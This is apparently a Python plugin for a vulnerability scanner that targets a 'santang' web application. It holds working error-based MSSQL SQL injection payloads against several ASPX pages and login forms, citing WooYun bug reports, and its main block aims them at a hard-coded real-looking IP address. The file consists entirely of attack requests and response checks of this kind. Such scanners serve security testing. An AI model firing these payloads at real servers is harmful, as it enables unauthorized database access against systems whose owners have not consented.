#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 01001000entai
#_PlugName_ = santang 3 sqli

import re

def assign(service, arg):
    if service == 'santang':
        return True, arg

def audit(arg):
    #No.1 http://www.wooyun.org/bugs/wooyun-2010-0105992
    payload = "AllInfor/Experiment_baseInfor.aspx?SYXH=1%27%20and%201=convert(int,(select%20sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))))%20and%20%271%27=%271"
    target = arg + payload
    code, head, body, errcode, final_url = curl.curl2(target);
    if 'c4ca4238a0b923820dcc509a6f75849' in body:
       security_hole(target)
    #No.2 http://www.wooyun.org/bugs/wooyun-2010-0105283
    payload = "OpenTimsUI/STUMODEL/StuBookExpCell.aspx?codeID=1%27%20and%201=convert(int,(select%20sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))))%20and%20%271%27=%271"
    target = arg + payload
    code, head, body, errcode, final_url = curl.curl2(target);
    if 'c4ca4238a0b923820dcc509a6f75849' in body:
        security_hole(target)
    #No.3 http://www.wooyun.org/bugs/wooyun-2010-0105279
    payload = "defaultnew.aspx"
    target = arg + payload
    code, head, body, errcode, final_url = curl.curl2(target);
    view = re.findall("id[\s\S]*=[\s\S]*\"__VIEWSTATE\"[\s\S]*value[\s\S]*=[\s\S]*\"([^<>]+)\" />", body)
    if len(view) == 0:
        view = re.findall("name[\s\S]*=[\s\S]*\"__VIEWSTATE\"[\s\S]*value[\s\S]*=[\s\S]*\"([^<>]+)\"", body)
    if len(view) == 0:
        return
    #v5.0
    _post = '__VIEWSTATE='+view[0]+'&txtUserName3=%27+and+1%3Dconvert%28int%2C%27hen%27%2B%27tai%27%29+and+%271%27%3D%271&txtPassword3=&ddlUserType3=0&btnLogin=%B5%C7+%C2%BC+'
    code, head, body, errcode, final_url = curl.curl2(target,post=_post);
    if 'hentai' in body:
        security_hole(target)
        return
    #v4.0
    _post = '__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE='+view[0]+'&UserName=%27%29+and+1%3Dconvert%28int%2C%27hen%27%2B%27tai%27%29+and+%28%271%27%3D%271&PassWord=123&Submit.x=43&Submit.y=12&radiobutton=R2'
    code, head, body, errcode, final_url = curl.curl2(target,post=_post);
    if 'hentai' in body:
        security_hole(target) 
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('santang', 'http://58.42.243.135:9100/')[1])